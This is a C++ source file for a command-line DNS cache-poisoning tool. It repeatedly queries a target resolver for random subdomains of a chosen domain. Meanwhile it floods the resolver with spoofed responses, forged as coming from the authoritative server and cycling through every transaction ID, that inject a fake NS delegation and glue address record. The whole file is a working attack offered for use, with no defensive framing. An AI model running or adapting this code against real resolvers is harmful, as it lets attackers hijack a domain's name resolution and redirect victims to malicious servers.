#include "udpv4client.hpp"
#include "dns.hpp"
#include "sourceport.hpp"
#include <iostream>
#include <cstring>
#include <sstream>
#include <boost/program_options.hpp>

int main( int argc, char **argv )
{
    namespace po = boost::program_options;
    std::string     target_dns_server;
    boost::uint16_t target_source_port;
    std::string     authoritative_dns_server;
    std::string     target_domainname;
    std::string     delegated_dns_server_name;
    std::string     delegated_dns_server_address;

    po::options_description desc("DNS Cache poisoning");
    desc.add_options()
        ("help,h",
         "print this message")

        ("target,t",
         po::value<std::string>(&target_dns_server),
         "Target(poisoned) DNS Server IP Address")

        ("source_port,s",
         po::value<boost::uint16_t>(&target_source_port)->default_value( 0 ),
         "Target(poisoned) DNS Server Query Source Port")

        ("auth,a",
         po::value<std::string>(&authoritative_dns_server),
         "Authoritative DNS Server IP Address")

        ("domain,n",
         po::value<std::string>(&target_domainname),
         "Target domainname")

        ("delegate_name,d",
         po::value<std::string>(&delegated_dns_server_name),
         "Delegated DNS Server name")

        ("delegate_address,e",
         po::value<std::string>(&delegated_dns_server_address),
         "Delegated DNS Server Address")
        ;

    po::variables_map vm;
    po::store(po::parse_command_line(argc, argv, desc), vm);
    po::notify(vm);

    if ( vm.count("help") ) {
        std::cerr << desc << "\n";
        return 1;
    }

    if ( vm.count( "target" )           != 1 ||
         vm.count( "auth"   )           != 1 ||
         vm.count( "domain" )           != 1 ||
         vm.count( "delegate_name" )    != 1 ||
         vm.count( "delegate_address" ) != 1 ) {
        std::cerr << desc << "\n";
        return 1;
    }

    dns::ResponsePacketInfo res;
    dns::SourcePortGenerator source_port( target_source_port );

    unsigned long index = 0;
    while ( true ) {
        index++;
        std::ostringstream qname;
        qname << "s" << index << "." << target_domainname;

        dns::QuestionSection question;
        question.q_domainname = qname.str();
        question.q_type       = dns::TYPE_A;
        question.q_class      = dns::CLASS_IN;

        dns::QueryPacketInfo query;
        query.id        = 0x1234;
        query.recursion = true;
        query.question.push_back( question );

        std::vector<boost::uint8_t> dns_query_packet = dns::generate_dns_query_packet( query );

        udpv4::ClientParameters udp_param;
        udp_param.destination_address = target_dns_server;
        udp_param.destination_port    = 53;
        udpv4::Client udp( udp_param );
        udp.sendPacket( dns_query_packet.data(), dns_query_packet.size() );

        udpv4::PacketInfo received_packet;
        for ( int id = 0 ; id < 0xffff ; id++ ) {

            dns::ResponseSection authority;
            authority.r_domainname    = target_domainname;
            authority.r_type          = dns::TYPE_NS;
            authority.r_class         = dns::CLASS_IN;
            authority.r_ttl           = 86400;
            authority.r_resource_data = dns::ResourceDataPtr( new dns::RecordNS( delegated_dns_server_name ) );

            dns::ResponseSection additional_infomation;
            additional_infomation.r_domainname    = delegated_dns_server_name;
            additional_infomation.r_type          = dns::TYPE_A;
            additional_infomation.r_class         = dns::CLASS_IN;
            additional_infomation.r_ttl           = 86400;
            additional_infomation.r_resource_data = dns::ResourceDataPtr( new dns::RecordA( delegated_dns_server_address ) );

            dns::ResponsePacketInfo response;
            response.id                   = id;
            response.authoritative_answer = true;
            response.recursion_available  = false;
            response.truncation           = false;
            response.authentic_data       = false;
            response.checking_disabled    = false;
            response.response_code        = dns::NO_ERROR;

            response.question.push_back( question );
            response.authority.push_back( authority );
            response.additional_infomation.push_back( additional_infomation );

            udpv4::Sender sender;
            udpv4::PacketInfo response_packet;
            response_packet.source_address      = authoritative_dns_server;
            response_packet.destination_address = target_dns_server;
            response_packet.source_port         = 53;
            response_packet.destination_port    = 10053; //source_port.get();
            response_packet.payload             = dns::generate_dns_response_packet( response );

            sender.sendPacket( response_packet );

            received_packet = udp.receivePacket( true );
            if ( received_packet.getPayloadLength() > 0 )
                break;
        }

        if ( received_packet.getPayloadLength() == 0 )
            continue;

        res = dns::parse_dns_response_packet( received_packet.begin(), received_packet.end() );

        if ( res.response_code == dns::NO_ERROR ) {
            break;
        }
        if ( res.response_code == dns::SERVER_ERROR )
            break;
    }
poisoned:

    for ( std::vector<dns::QuestionSection>::const_iterator i = res.question.begin() ;
          i != res.question.end() ; ++i )
        std::cout << "Query: " << i->q_domainname << std::endl;
    for ( std::vector<dns::ResponseSection>::const_iterator i = res.answer.begin() ;
          i != res.answer.end() ; ++i ) {
        std::cout << "Answer: " << i->r_domainname << " " << i->r_ttl << " " << i->r_type << " " << i->r_resource_data->toString() << std::endl;
    }
    for ( std::vector<dns::ResponseSection>::const_iterator i = res.authority.begin() ;
          i != res.authority.end() ; ++i ) {
        std::cout << "Authority: " << i->r_domainname << " " << i->r_ttl << " " << i->r_type << " " << i->r_resource_data->toString() << std::endl;
    }
    for ( std::vector<dns::ResponseSection>::const_iterator i = res.additional_infomation.begin() ;
          i != res.additional_infomation.end() ; ++i ) {
        std::cout << "Additional: " << i->r_domainname << " " << i->r_ttl << " " << i->r_type << " " << i->r_resource_data->toString() << std::endl;
    }


    return 0;
}
